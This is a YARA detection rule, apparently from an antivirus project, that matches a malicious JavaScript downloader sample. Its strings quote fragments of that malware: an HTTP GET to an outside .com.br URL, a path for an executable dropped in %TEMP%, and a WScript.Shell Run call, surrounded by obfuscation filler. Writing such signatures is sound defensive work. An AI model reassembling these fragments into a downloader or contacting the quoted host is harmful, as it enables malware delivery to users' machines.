rule sig_20160329_d830cfc99c6a1b9f08f7f72d9352da7b {
  meta:
    description = "datamaliciousorder - file 20160329_d830cfc99c6a1b9f08f7f72d9352da7b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "24d65f102553a2be58f14895cad1da553ee1287d5e38112082e3d0f2a464eeac"

  strings:
    $s1  = "td[e](\"GET\", \"http://caferacerpneus.com.br/lw2osd\", false);" fullword ascii
    $s2  = "function n() {return S[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"qKrWCnxQyI.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Yu](jv() * 11); if (td[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function m(n0, co){t0 = t0 * 1; return n0 - co;};" fullword ascii
    $s5  = "var S = function O() {return WScript[q](\"WScript.Shell\");}(), Uu = 11;" fullword ascii
    $s6  = "function ok(){return \"\" + MJ;};" fullword ascii
    $s7  = "function t() {return ((Q == true) && (Q == oq)) ? 1 : t0;};" fullword ascii
    $s8  = "function K(i){S[\"Run\"](i, t0, t0);};" fullword ascii
    $s9  = " while (K0){" fullword ascii
    $s10 = "return m(wX, P);" fullword ascii
    $s11 = "function Yb(k) {var em = (1, 2, 3, 4, 5, k); return em;};" fullword ascii
    $s12 = "function jv(){return 22;};" fullword ascii
    $s13 = "function eQ()" fullword ascii
    $s14 = "function V(){return q;};" fullword ascii
    $s15 = "var bC = new this[\"Date\"]();" fullword ascii
    $s16 = "Q = true; " fullword ascii
    $s17 = "var Q = false;" fullword ascii
    $s18 = "var oq = false;" fullword ascii
    $s19 = "oq = true; " fullword ascii
    $s20 = "var DQ = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}